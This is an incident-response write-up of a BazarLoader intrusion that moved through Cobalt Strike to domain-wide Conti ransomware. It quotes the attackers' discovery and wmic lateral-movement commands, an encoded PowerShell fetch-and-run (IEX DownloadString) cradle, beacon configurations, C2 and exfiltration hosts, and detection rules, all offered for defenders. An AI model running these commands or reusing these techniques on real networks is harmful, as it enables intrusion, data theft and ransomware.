# BazarLoader to Conti Ransomware in 32 Hours
### In July we witnessed a BazarLoader campaign that deployed Cobalt Strike and ended with domain wide encryption using Conti ransomware.

## Information:
+ Source: The DFIR Report
+ Link: https://thedfirreport.com/2021/09/13/bazarloader-to-conti-ransomware-in-32-hours/
+ Date: 2021-09-13T00:13:02+00:00
+ Author: editor


## Article:
![Article Image](https://thedfirreport.com/wp-content/uploads/2021/09/ca58f3e4e67ad87f182addb8f788c7a7ddd46ed64030d3b812f759310ea22d4d.png)


### Intro


Conti is a top player in the ransomware ecosystem, being listed as 2nd overall in the [Q2 2021 Coveware ransomware report](https://www.coveware.com/blog/2021/7/23/q2-ransom-payment-amounts-decline-as-ransomware-becomes-a-national-security-priority). The groups deploying this RaaS have only grown more [prevalent](https://twitter.com/AltShiftPrtScn/status/1431423623621918727?s=20). Despite the group having it’s affiliate guide leaked, which revealed many techniques already covered in [previous reports](https://thedfirreport.com/2021/08/01/bazarcall-to-conti-ransomware-via-trickbot-and-cobalt-strike/), the group’s using the ransomware are unlikely to let up any time soon.


In July we witnessed a BazarLoader campaign that deployed Cobalt Strike and ended with domain wide encryption using Conti ransomware.


### Case Summary


BazarLoader has continued to be one of the preeminent initial access brokers for ransomware threat actor access. For this intrusion we don’t know the initial campaign that deployed the malware but based on previous information, we can assess with high confidence that the delivery vector was a malicious email campaign. At the time of the intrusion, the group was [favoring zip attachments](https://twitter.com/malware_traffic/status/1412470165179092992) with malicious javascript files to download the BazarLoader malware. However BazarLoader has also been used with [Word](https://twitter.com/James_inthe_box/status/1422191753218576392?s=20) and [Excel](https://thedfirreport.com/2021/03/08/bazar-drops-the-anchor/) documents as well.


In this case we observed the initial activity beginning with a BazarLoader DLL. Upon initial execution on the beachhead, the malware made an initial connection to command and control, and then a few minutes later it performed discovery tasks on the host using Microsoft utilities like Net and Nltest to discover the domain and users of interest. like domain administrators. After this activity, the host went quiet for about one hour before downloading and executing a Cobalt Strike beacon DLL.


The threat actors used Cobalt Strike to run additional discovery tasks using Microsoft utilities like net, ping, systeminfo, and taskmanager. The threat actors then began using pass the hash with various accounts which continued several times throughout the intrusion. To see what machines were active in the environment, the threat actors scanned the network for SMB.


Around two and a half hours into the intrusion the threat actors began lateral movement. Lateral movement began by the threat actor transferring an executable to a remote system and then executing it using wmic. This was the primary lateral movement option favored by the threat actor, however PowerShell Cobalt Strike beacons, service executable Cobalt Strike beacons, and RDP were all used, but less commonly. Once on remote systems the threat actor used Cobalt Strike to dump lsass memory for further credentials.


After this phase completed, the threat actor’s activity faded but the Cobalt Strike continued to beacon out to the C2 server. About 12 hours later the threat actors became active again. From the domain controller the threat actors continued further lateral movement to more servers in the environment. They also continued further discovery activity running PowerShell scripts to discover the disk utilization of hosts, review user last login time per host, assess the installed anti-virus software, and track which hosts were online for the threat actors to target.


When the threat actors identified the file server, their method for data exfiltration was straightforward to a fault. They downloaded WinSCP from the project website, installed it on the file server and proceeded to exfiltrate data from the server using SCP to a VPS host they controlled in Romania.


Around 31 hours after initial access to the environment, the threat actors felt they were ready to complete their final objectives. RDP activity was seen from several hosts and an executable named test.exe was transferred to several endpoints. This test file was the Conti ransomware executable, and the threat actors decided to test in a controlled manner before running the full domain ransomware deployment. Like before, these “unit tests,” were performed using wmic to execute the files remotely on the endpoints.


The threat actors must have confirmed quickly that their tests were successful as within minutes they dropped test.exe renamed to backup.exe on two servers in the environment and executed manually via their RDP sessions. When executed in this manner the ransomware mounts all remote C$ drives in the local network and proceeds to encrypt the contents over the SMB connection. At this point, the Time to Ransom (TTR) for the threat actors was just shy of 32 hours since initial access.


### Services


We offer multiple services including a [Threat Feed](https://thedfirreport.com/services/) service which tracks Command and Control frameworks such as Cobalt Strike, Metasploit, Empire, PoshC2, BazarLoader, etc. More information on this service and others can be found [here](https://thedfirreport.com/services/). The Cobalt Strike server used in this intrusion was added to our [Threat Feed](https://thedfirreport.com/services/) on 07/01/2021.


We also have artifacts and IOCs available from this case such as pcaps, memory captures, files, event logs including Sysmon, Kape packages, and more, under our [Security Researcher and Organization](https://www.patreon.com/thedfirreport) services.


### Timeline


![](https://thedfirreport.com/wp-content/uploads/2021/09/BazarLoader-to-Conti-Ransomware-in-32-Hours.png)


Analysis and reporting completed by [@ICSNick](https://twitter.com/IcsNick) and [@MetallicHack](https://twitter.com/MetallicHack)


Reviewed by [@V3T0\_](https://twitter.com/v3t0_) and [@THIR\_Sec](https://twitter.com/THIR_Sec)


### MITRE ATT&CK


### Initial Access


In this case we did not observe the initial delivery for the malware. BazarLoader however tends to arrive in an environment via malicious email campaigns and in a few cases its been reported via [call centers](https://unit42.paloaltonetworks.com/bazarloader-malware/) social engineering users to load the malware. Seeing that this starts with a DLL file it is more likely that this was related to an email campaign using malicious [zipped Javascript](https://twitter.com/malware_traffic/status/1412470165179092992) files.


### Execution


Initial execution occurred via the [Bazarloader DLL](https://bazaar.abuse.ch/sample/24f692b4ee982a145abf12c5c99079cfbc39e40bd64a3c07defaf36c7f75c7a9/) being executed by rundll32.


About an hour after the initial execution on the beachhead, a Cobalt Strike beacon was executed also with rundll32.


![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/09/97e5c958838ea185e8c0f7331b5f8b08d6216d17eff278071f4cf2bbe1e6d863.png "enter image title here")


### Privilege Escalation


The threat actors made use of pass the hash techniques to try to escalate privileges during the intrusion. Various accounts were targeted including a Guest account initially.



```
"An account was successfully logged on.

Subject:
  Security ID:    S-1-5-21-********
  Account Name:    USER
  Account Domain:    DOMAIN
  Logon ID:    0x1296D94

Logon Information:
  Logon Type:    9
  Restricted Admin Mode:  -
  Virtual Account:    No
  Elevated Token:    No

Impersonation Level:    Impersonation

New Logon:
  Security ID:    S-1-5-21-*******
  Account Name:    USER
  Account Domain:    DOMAIN
  Logon ID:    0x173D205
  Linked Logon ID:    0x0
  Network Account Name:  Guest
  Network Account Domain:  .
  Logon GUID:    {00000000-0000-0000-0000-000000000000}

Process Information:
  Process ID:    0x68c
  Process Name:    C:\Windows\System32\svchost.exe

Network Information:
  Workstation Name:  -
  Source Network Address:  ::1
  Source Port:    0

Detailed Authentication Information:
  Logon Process:    seclogo
  Authentication Package:  Negotiate
  Transited Services:  -
  Package Name (NTLM only):  -
  Key Length:    0


```

Process injection was seen from the Cobalt Strike beacon into a svchost process running with System level privilege.



```
"CreateRemoteThread detected:
RuleName: technique\_id=T1055,technique\_name=Process Injection
UtcTime: ***
SourceProcessGuid: {1227cce3-2e6a-60de-f909-000000000700}
SourceProcessId: 8924
SourceImage: C:\Windows\System32\rundll32.exe
TargetProcessGuid: {1227cce3-2032-60de-5c08-000000000700}
TargetProcessId: 6192
TargetImage: C:\Windows\System32\svchost.exe
NewThreadId: 8916
StartAddress: 0x00000243EFCA0002
StartModule: -
StartFunction: -"

```

### Defense Evasion


While in the environment they injected Cobalt Strike beacons into many processes.


**Processes with CS beacon injected or running**






| .Pid | .ProcessName | .CommandLine |
| 4076 | svchost.exe | C:\Windows\system32\svchost.exe -k UnistackSvcGroup |
| 2428 | taskhostw.exe | taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E} |
| 576 | winlogon.exe | winlogon.exe |
| 560 | winlogon.exe | winlogon.exe |
| 4024 | taskhostw.exe | taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E} |
| 3408 | explorer.exe | C:\Windows\Explorer.EXE |
| 560 | winlogon.exe | winlogon.exe |
| 2340 | explorer.exe | C:\Windows\Explorer.EXE |
| 4156 | dllhost.exe | C:\Windows\syswow64\dllhost.exe |
| 4240 | cmd.exe | C:\Windows\system32\cmd.exe /C time |
| 4216 | winlogon.exe | winlogon.exe |
| 2516 | taskhostw.exe | taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E} |
| 1828 | explorer.exe | C:\Windows\Explorer.EXE |
| 5128 | dllhost.exe | C:\Windows\syswow64\dllhost.exe |
| 3208 | taskhostw.exe | taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E} |
| 6192 | svchost.exe | C:\Windows\system32\svchost.exe -k UnistackSvcGroup -s WpnUserService |
| 8400 | explorer.exe | C:\Windows\Explorer.EXE |
| 3796 | SecurityHealthSystray.exe | “C:\Windows\System32\SecurityHealthSystray.exe” |
| 8924 | rundll32.exe | rundll32.exe C:\Users\USER\AppData\Local\Temp\7A86.dll,DllRegisterServer |
| 5284 | dllhost.exe | C:\Windows\system32\dllhost.exe |
| 504 | svchost.exe | C:\Windows\system32\svchost.exe -k UnistackSvcGroup |
| 3252 | taskhostw.exe | taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E} |
| 656 | winlogon.exe | winlogon.exe |
| 5656 | explorer.exe | C:\Windows\Explorer.EXE |
| 5964 | svchost.exe | C:\Windows\system32\svchost.exe -k ClipboardSvcGroup -p -s cbdhsvc |


 


### Credential Access


The threat actors were seen dumping credentials out of lsass memory across the domain.


![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/09/3841a1795efd9ccdf0228f0b2bcbc32b6ce3236f9882c448ff684b094040c34e.png "enter image title here")


### Discovery


The BazarLoader malware on the beachhead began discovery actions around 20 minutes after the initial execution. The discovery commands utilize the familiar built in Microsoft utilities.



```
nltest /domain_trusts /all_trusts
net localgroup "administrator"
net group "domain admins" /dom
C:\Windows\system32\net1 group "domain admins" /dom

```

The Cobalt Strike beacon ran additional discovery tasks on the beachhead. Again built in Microsoft utilities were utilized.



```
C:\Windows\system32\cmd.exe /C systeminfo
C:\Windows\system32\cmd.exe /C ping DOMAINCONTROLLER
C:\Windows\system32\cmd.exe /C ping ENDPOINT
C:\Windows\system32\cmd.exe /C net localgroup Administrators
C:\Windows\System32\Taskmgr.exe

```

Throughout the intrusion the threat actor checked the time of systems with:



```
C:\Windows\system32\cmd.exe /C time

```

From an svchost process injected with a Cobalt Strike beacon, SMB scanning was performed across the environment.


![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/09/c557160a1cf5df6d2000f3011c6aba2983c6a4b828623853181e587461222e23.png "enter image title here")


From the domain controller the threat actor ran an encoded PowerShell command to review the size and condition of hard drives across the environment.



```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgAyADQANgAxAC8AJwApADsAIABHAGUAdAAtAFcAbQBpAE8AYgBqAGUAYwB0ACAALQBDAGwAYQBzAIAB3AGkAbgAzADIAXwBsAZwBpAGMAYQBsAaQBzAGsAIAAtAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlACAARQB4AHQAZQByAG4AYQBsAFMAZQByAHYAMwAgAHwAIABTAGUAbABlAGMAdAAtAE8AYgBqAGUAYwB0ACAAcABzAGMAbwBtAHAAdQB0AGUAcgBuAGEAbQBlACwAIABOAGEAbQBlACwAIABAAHsAbgA9ACIAUwBwAGEAYwBlACIAOwBlAD0AewBbAG0AYQB0AGgAXQA6ADoAUgBvAHUAbgBkACgAJABfAC4AUwBpAHoAZQAvADEARwBCACwAMgApAH0AfQAsACAAQAB7AG4APQAiAEYAcgBlAGUAUwBwAGEAYwBlACIAOwBlAD0AewBbAG0AYQB0AGgAXQA6ADoAUgBvAHUAbgBkACgAJABfAC4ARgByAGUAZQBTAHAAYQBjAGUALwAxAEcAQgAsADIAKQB9AH0ALAAgAEAAewBuAD0AIgBCAFUAUwBZACIAOwBlAD0AewBbAG0AYQB0AGgAXQA6ADoAUgBvAHUAbgBkACgAKAAkAF8ALgBTAGkAegBlAC0AJABfAC4ARgByAGUAZQBTAHAAYQBjAGUAKQAvADEARwBCACwAMgApAH0AfQA=

```

Decoded:



```
IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:33242/'); Get-WmiObject -Class win32\_logicalDisk -ComputerName SYSTEMNAME | Select-Object pscomputername, Name, @{n="Space";e={[math]::Round($\_.Size/1GB,2)}}, @{n="FreeSpace";e={[math]::Round($\_.FreeSpace/1GB,2)}}, @{n="BUSY";e={[math]::Round(($\_.Size-$\_.FreeSpace)/1GB,2)}}

```

Powersploit modules like Get-NetComputer were seen used by the threat actor from the domain controller



```
IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:36595/'); Get-NetComputer -ping -operatingsystem *server*

```

The script Get-DataInfo.ps1, which has been used in [many intrusions this past year](https://thedfirreport.com/?s=get-datainfo), was also employed. This file was started by the use of start.bat, which has been seen paired with this script repeatedly.



```
C:\Windows\system32\cmd.exe /c "C:\\Users\\info\\start.bat"

```

![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/01/bazar-1013-discovery-1.png "enter image title here")



```
powershell.exe -executionpolicy remotesigned -File .\Get-DataInfo.ps1 method

```

The contents of Get-DataInfo.ps1 provide the threat actor with very specific details of the environment. This includes things like disk size, connectivity, antivirus software, and backup software.


![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/01/bazar-1013-discovery-2.png "enter image title here")


This script was first reported used by threat actors deploying the Ryuk ransomware strain.


The Microsoft Active Directory PowerShell module was also imported and used for discovery tasks.



```
Get-ADComputer -Filter {enabled -eq $true} -properties *|select Name, DNSHostName, OperatingSystem, LastLogonDate | Export-CSV C:\Users\AllWindows.csv -NoTypeInformation -Encoding UTF8

```

### Lateral Movement


For lateral movement the threat actors relied heavily on copying executable files over SMB and then executing them via remote WMIC calls


![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/09/a4b036eef4b4d1fff7d9c1548862bf2dbb3b811c8019b001c45d495810e00aff.png "enter image title here")



```
C:\Windows\system32\cmd.exe /C wmic /node:"DOMAINCONTROLLER" process call create "C:\3.exe"

```

While executables and wmic were the preferred options for the threat actor, they did employ several other techniques.


Remote Cobalt Strike beacons were started with services and PowerShell several times in the environment.


![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/09/6ddde1bc3e6d318f6bcef9593645b2839c704ad07922435df71b1fc1217ccaac.png "enter image title here")


During the final stages the threat actor used RDP to move between a few servers as part of their final actions.


At that time, a Cobalt Strike beacon executable was executed as a service on a remote host for testing the final ransom deployment.


![](https://thedfirreport.com/wp-content/uploads/2021/09/55.png)


### Command and Control


BazarLoader:


34.219.130.241:443



```
JA3: 72a589da586844d7f0818ce684948eea
JA3s: e35df3e00ca4ef31d42b34bebaa2f86e
```


```
Certificate: [ff:5f:80:d9:5b:9b:b1:d7:2e:49:c7:96:87:8e:7d:76:6e:67:e3:94 ]
Not Before: 2021/06/28 07:41:39 UTC 
Not After 2022/06/28 07:41:39 UTC 
Issuer Org NN Fern 
Subject Common forenzik.kz 
Subject Org NN Fern 
Public Algorithm rsaEncryption

```

13.56.161.214:443



```
JA3: 72a589da586844d7f0818ce684948eea
JA3s: e35df3e00ca4ef31d42b34bebaa2f86e
```


```
Certificate:[d9:80:5b:d4:7a:40:21:54:ec:10:49:d4:ee:38:57:e2:2b:b8:25:f2]
Not Before: 2021/06/28 07:54:14 UTC 
Not After: 2022/06/28 07:54:14 UTC 
Issuer Org: NN Fern 
Subject Common: forenzik.kz 
Subject Org: NN Fern 
Public Algorithm: rsaEncryption

```

Cobalt Strike:


sammitng.com (162.244.83.216) – This Cobalt Strike server was added to our [Threat Feed](https://thedfirreport.com/services/) on 07/01/2021.


![](https://thedfirreport.com/wp-content/uploads/2021/09/1-1.png)


This server was seen communicating with multiple internal systems:


![](https://thedfirreport.com/wp-content/uploads/2021/09/1.png)





```
JA3: a0e9f5d64349fb13191bc781f81f42e1
JA3s: ae4edc6faf64d08308082ad26be60767
```


```
Certificate: [07:6f:84:54:eb:a9:26:a6:c8:4b:fd:e8:0e:95:e0:a6:62:b2:01:ae]
Not Before: 2021/06/25 05:11:41 UTC 
Not After: 2021/09/23 05:11:40 UTC 
Issuer Org: Let's Encrypt 
Subject Common: sammitng.com [sammitng.com ,www.sammitng.com ]
Public Algorithm: rsaEncryption

```


```
{
  "x86": {
 "sha1": "6a31edc3e73957bb25e51abfd4efb4fd5eb51dbc",
 "time": 1625176656098.3,
 "md5": "29154f55df2171ccfe6316a77496d451",
 "sha256": "c867fbc963c6975918f6744e196e0cc648777c7252ca740254e6eed9918c6fd1",
 "config": {
 "Spawn To x86": "%windir%\\syswow64\\dllhost.exe",
 "Polling": 5000,
 "Port": 80,
 "Jitter": 10,
 "HTTP Method Path 2": "/jquery-3.3.2.min.js",
 "Method 2": "POST",
 "C2 Server": "162.244.83.216,/jquery-3.3.1.min.js",
 "Method 1": "GET",
 "Beacon Type": "0 (HTTP)",
 "Spawn To x64": "%windir%\\sysnative\\dllhost.exe"
 }
 },
  "x64": {
 "sha1": "856366815cac27775b944a236ad3a6f523a4136d",
 "time": 1625176667352.5,
 "md5": "b656845e2755920db24364b42ce2ea18",
 "sha256": "5c649554d9ea77e98dbf0df0d4010255075c6c5324fc7526c667a180c06a050a",
 "config": {
 "Spawn To x86": "%windir%\\syswow64\\dllhost.exe",
 "Polling": 5000,
 "Port": 80,
 "Jitter": 10,
 "HTTP Method Path 2": "/jquery-3.3.2.min.js",
 "Method 2": "POST",
 "C2 Server": "162.244.83.216,/jquery-3.3.1.min.js",
 "Method 1": "GET",
 "Beacon Type": "0 (HTTP)",
 "Spawn To x64": "%windir%\\sysnative\\dllhost.exe"
 }
 }
}
{
  "x86": {
 "sha1": "c07dbec39149a3bb20a54b9eeb2e453a7c5bdd2f",
 "time": 1625176651726.3,
 "md5": "a5daabadee5233ad9941b39e39f6ce7b",
 "sha256": "bea4dcabc10ad8b7ef79579a1c511ec42cb98ddd1cf607a5a5ee369b28aa144b",
 "config": {
 "Spawn To x86": "%windir%\\syswow64\\dllhost.exe",
 "Polling": 5000,
 "Port": 443,
 "Jitter": 10,
 "HTTP Method Path 2": "/jquery-3.3.2.min.js",
 "Method 2": "POST",
 "C2 Server": "sammitng.com,/jquery-3.3.1.min.js",
 "Method 1": "GET",
 "Beacon Type": "8 (HTTPS)",
 "Spawn To x64": "%windir%\\sysnative\\dllhost.exe"
 }
 },
  "x64": {
 "sha1": "7ed8d5a2e09d48ccb84d790abfa7a1556b9d4990",
 "time": 1625176660366.2,
 "md5": "72296b01b37d6baefaecbc5bdecfadb6",
 "sha256": "31f8ad3f818ef0635109cecfff8f2e03f5e47a9a62a2fe548bc10393e3318d4f",
 "config": {
 "Spawn To x86": "%windir%\\syswow64\\dllhost.exe",
 "Polling": 5000,
 "Port": 443,
 "Jitter": 10,
 "HTTP Method Path 2": "/jquery-3.3.2.min.js",
 "Method 2": "POST",
 "C2 Server": "sammitng.com,/jquery-3.3.1.min.js",
 "Method 1": "GET",
 "Beacon Type": "8 (HTTPS)",
 "Spawn To x64": "%windir%\\sysnative\\dllhost.exe"
 }
 }
}

```

In addition to these command and control methods, one more network anomaly was observed. This was not used for primary command and control and the amount of data sent was small so we do not know the full intentions of the activity but several critical systems like domain controllers and file servers made connections to TOR nodes initiated by the threat actors.


![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/09/65c2a30ef8a12723f81341b984424b3c3d3e1c954d72b66a29f5f9c1a704502e.png "enter image title here")


### Exfiltration


The threat actor on the second day of the intrusion downloaded WinSCP to the file server and proceeded to install the program there.



```
C:\Users\REDACTED\AppData\Local\Temp\1\is-HCFKT.tmp\WinSCP-5.19.1-Setup.tmp" /SL5="$A02B0,10288106,864256,C:\Users\USER\Desktop\WinSCP-5.19.1-Setup.exe"

```

The threat actor then proceeded to connect over port 22 to a server in Romania.


![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/09/f348f67ef89090bbfc0a6dbf0ed0a991bc5407ad7343330cc4278b8d13a24a08.png "enter image title here")


As the traffic was encrypted we can’t conclusively determine what data was exfiltrated. However we can infer that the choice to deploy on the file server was due to the data present and ease to move the data.


Another data point is that following the exfiltration canary documents present in the shares reported in as being opened from an IP on a Virtual Private Host provider in New York, USA.


### Impact


During the overnight hours of the 2nd day the threat actors began moving on their final objectives. This included testing their ransomware in the compromised environment before deploying across the domain.


![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/09/ca58f3e4e67ad87f182addb8f788c7a7ddd46ed64030d3b812f759310ea22d4d.png "enter image title here")


They initiated RDP connections and a Cobalt Strike beacon executable file to a endpoint not yet interacted with by the threat actors. The threat actor then transferred a Conti executable file to several endpoints named test.exe.


![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/09/f417213c761742e26088002aa58fcb7bbcaf9c6476210f70ffb8561dc62d0a65.png "enter image title here")


These test ransom files were then called remotely using wmic as seen in the previous lateral movement activity.



```
C:\Windows\system32\cmd.exe /C wmic /node:"ENDPOINT" process call create "C:\test.exe"

```

After testing on several endpoints, the threat actors dropped a renamed version of the file on several servers in the environment and executed by hand using their RDP session.


![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/09/cf4d9744a30cc4546ade85d71cdf113cc8863008012c01e9474785d638a17d8f.png "enter image title here")


When executed in this manner, the ransomware payload attempts to spread laterally over SMB.


![enter image description here](https://thedfirreport.com/wp-content/uploads/2021/09/823b02bd3a4ae97e0e3b1c7df9ee032c7fc955144f9b912703472a9ca24993ad.png "enter image title here")


From there, the threat actors left the environment with this note and domain wide encryption completed about 32 hours after the initial beachhead BazarLoader was executed.


[![](https://thedfirreport.com/wp-content/uploads/2021/09/4b0ae07d39e5c2840b2ce4d44b5061a209d5b2144953eb2fec17635a49dd824e.png)](https://thedfirreport.com/wp-content/uploads/2021/09/4b0ae07d39e5c2840b2ce4d44b5061a209d5b2144953eb2fec17635a49dd824e.png)


### IOCs


##### Network



```
34.219.130.241|443
13.56.161.214|443
31.14.40.160|22
sammitng.com
162.244.83.216|80 

```

##### File



```
24f692b4ee982a145abf12c5c99079cfbc39e40bd64a3c07defaf36c7f75c7a9.exe
215e0accdf538d48a8a7bf79009e8f9b
4ff45fb8003ab1075bdbbc9d044b7c31374f3cdb
24f692b4ee982a145abf12c5c99079cfbc39e40bd64a3c07defaf36c7f75c7a9
backup.exe
4b566c684c1cfc980e14b968f15feb68
e115f1be72f730bf3a7b7d9e2ec9e4b7b7a4b5e7
7268dadee16e6ac6d618927c0061163505af6a591fae99fe207092f9d0e3cfd0
7A86.dll
abbbd0e30c4e66ad59518b9460dbcdfd
981b2e54444d65e1104ab27d36d0ac9c6766478c
9d63a34f83588e208cbd877ba4934d411d5273f64c98a43e56f8e7a45078275d
162.244.83.216-cs.exe
220007be6f16eb7300a99d0d84f83059
38b0e925d7a3dae50585b2ee985904a7cdc0e47f
82336da6be3130795a0f41a4f389b957e1d97633f8cb5e38ab40c8d62430b5a5
3.exe
0e2e8dfeec2168c2b3628ca2fb6c0736
bf92ce7c065568c1b893c1ababa04eeffedadcca
37b264e165e139c3071eb1d4f9594811f6b983d8f4b7ef1fe56ebf3d1f35ac89
Get-DataInfo.ps1
16cde93b441e4363700dfbf34c687b08
092ac6f8d072c4cf045e35a839d5bb8f1360f1ae
a290ce75c6c6b37af077b72dc9c2c347a2eede4fafa6551387fa8469539409c7
start.bat
0ab5c442d5a202c213f8a2fe2151fc3f
a780085d758aa47bddd1e088390b3bcc0a3efc2e
63de40c7382bbfe7639f51262544a3a62d0270d259e3423e24415c370dd77a60


```

### Detections


##### Network



```
ET MALWARE Observed Malicious SSL Cert (Bazar Backdoor)
ET MALWARE Observed Malicious SSL Cert (Bazar CnC)
ET MALWARE Cobalt Strike Malleable C2 JQuery Custom Profile M2
ET MALWARE Cobalt Strike Malleable C2 JQuery Custom Profile Response
ET POLICY TLS possible TOR SSL traffic
ET TOR Known Tor Relay/Router (Not Exit) Node Traffic group 234
ET HUNTING Possible Powershell .ps1 Script Use Over SMB
ET POLICY Possible WMI .mof Managed Object File Use Over SMB
ET POLICY SMB2 NT Create AndX Request For a .bat File
ET POLICY SMB2 NT Create AndX Request For a DLL File - Possible Lateral Movement
ET POLICY SMB2 NT Create AndX Request For an Executable File
ET POLICY SMB2 NT Create AndX Request For a Powershell .ps1 File
ET SCAN Behavioral Unusual Port 135 traffic Potential Scan or Infection
```

##### Sigma


[CobaltStrike Service Installations](https://github.com/SigmaHQ/sigma/blob/1b480f2ee609e196fcaf6bfee11cf26133f64435/rules/windows/builtin/win_cobaltstrike_service_installs.yml) 


[Suspicious Remote Thread Created](https://github.com/SigmaHQ/sigma/blob/e7d9f1b4279a235406b61cc9c16fde9d7ab5e3ba/rules/windows/create_remote_thread/sysmon_suspicious_remote_thread.yml)


[Domain Trust Discovery](https://github.com/SigmaHQ/sigma/blob/99b0d32cec5746c8f9a79ddbbeb53391cef326ba/rules/windows/process_creation/win_trust_discovery.yml)  [Quick Execution of a Series of Suspicious Commands](https://github.com/SigmaHQ/sigma/blob/7f071d785157dfe185d845fad994aa6ec05ac678/rules/windows/process_creation/win_multiple_suspicious_cli.yml)


 [Pass the Hash Activity 2](https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/builtin/win_pass_the_hash_2.yml)


[Suspicious WMI Execution](https://github.com/SigmaHQ/sigma/blob/5e701a2bcb353338854c8ab47de616fe7e0e56ff/rules/windows/process_creation/win_susp_wmi_execution.yml)


[Successful Overpass the Hash Attempt](https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/builtin/win_overpass_the_hash.yml)


[Encoded IEX](https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_encoded_iex.yml)


##### Yara



```
/*
YARA Rule Set
Author: The DFIR Report
Date: 2021-09-01
Identifier: 5087
Reference: https://thedfirreport.com
*/

/* Rule Set ----------------------------------------------------------------- */

rule case_5087_start_bat { 
   meta: 
      description = "Files - file start.bat" 
      author = "The DFIR Report" 
      reference = "https://thedfirreport.com" 
      date = "2021-08-30" 
      hash1 = "63de40c7382bbfe7639f51262544a3a62d0270d259e3423e24415c370dd77a60" 
   strings: 
      $x1 = "powershell.exe Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force" fullword ascii 
      $x2 = "powershell.exe -executionpolicy remotesigned -File .\\Get-DataInfo.ps1 %method" fullword ascii 
      $x3 = "powershell.exe -executionpolicy remotesigned -File .\\Get-DataInfo.ps1 %1)" fullword ascii 
      $s4 = "set /p method=\"Press Enter for collect [all]: \"" fullword ascii 
      $s5 = "echo \"Please select a type of info collected:\"" fullword ascii 
      $s6 = "echo \"all ping disk soft noping nocompress\"" fullword ascii 
   condition: 
      filesize < 1KB and all of them 
} 



rule case_5087_3 { 
   meta: 
      description = "Files - file 3.exe" 
      author = "The DFIR Report" 
      reference = "https://thedfirreport.com" 
      date = "2021-08-30" 
      hash1 = "37b264e165e139c3071eb1d4f9594811f6b983d8f4b7ef1fe56ebf3d1f35ac89" 
   strings: 
      $s1 = "https://sectigo.com/CPS0" fullword ascii 
      $s2 = "?http://crl.usertrust.com/USERTrustRSACertificationAuthority.crl0v" fullword ascii 
      $s3 = "2http://crl.comodoca.com/AAACertificateServices.crl04" fullword ascii 
      $s4 = "3http://crt.usertrust.com/USERTrustRSAAddTrustCA.crt0%" fullword ascii 
      $s5 = " <requestedExecutionLevel level=\"asInvoker\"/>" fullword ascii 
      $s6 = "http://ocsp.sectigo.com0" fullword ascii 
      $s7 = "2http://crt.sectigo.com/SectigoRSACodeSigningCA.crt0#" fullword ascii 
      $s8 = "2http://crl.sectigo.com/SectigoRSACodeSigningCA.crl0s" fullword ascii 
      $s9 = "ealagi@aol.com0" fullword ascii 
      $s10 = "bhfatmxx" fullword ascii 
      $s11 = "orzynoxl" fullword ascii 
      $s12 = " <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">" fullword ascii 
      $s13 = " <!--The ID below indicates application support for Windows 8.1 -->" fullword ascii 
      $s14 = " <!--The ID below indicates application support for Windows 8 -->" fullword ascii 
      $s15 = "O:\\-e%" fullword ascii 
      $s16 = " <!--The ID below indicates application support for Windows 10 -->" fullword ascii 
      $s17 = " <!--The ID below indicates application support for Windows 7 -->" fullword ascii 
      $s18 = " <!--The ID below indicates application support for Windows Vista -->" fullword ascii 
      $s19 = " <compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\">" fullword ascii 
      $s20 = " </compatibility>" fullword ascii 
   condition: 
      uint16(0) == 0x5a4d and filesize < 1000KB and 8 of them 
} 

rule case_5087_7A86 { 
   meta: 
      description = "Files - file 7A86.dll" 
      author = "The DFIR Report" 
      reference = "https://thedfirreport.com" 
      date = "2021-08-30" 
      hash1 = "9d63a34f83588e208cbd877ba4934d411d5273f64c98a43e56f8e7a45078275d" 
   strings: 
      $s1 = "ibrndbiclw.dll" fullword ascii 
      $s2 = "AppPolicyGetProcessTerminationMethod" fullword ascii 
      $s3 = "Type Descriptor'" fullword ascii 
      $s4 = "operator co\_await" fullword ascii 
   condition: 
      uint16(0) == 0x5a4d and filesize < 500KB and all of them 
} 

 rule case_5087_24f692b4ee982a145abf12c5c99079cfbc39e40bd64a3c07defaf36c7f75c7a9 { 
   meta: 
      description = "Files - file 24f692b4ee982a145abf12c5c99079cfbc39e40bd64a3c07defaf36c7f75c7a9.exe" 
      author = "The DFIR Report" 
      reference = "https://thedfirreport.com" 
      date = "2021-08-30" 
      hash1 = "24f692b4ee982a145abf12c5c99079cfbc39e40bd64a3c07defaf36c7f75c7a9" 
   strings: 
      $s1 = "fbtwmjnrrovmd.dll" fullword ascii 
      $s2 = "AppPolicyGetProcessTerminationMethod" fullword ascii 
      $s3 = " Type Descriptor'" fullword ascii 
      $s4 = "operator co\_await" fullword ascii 
   condition: 
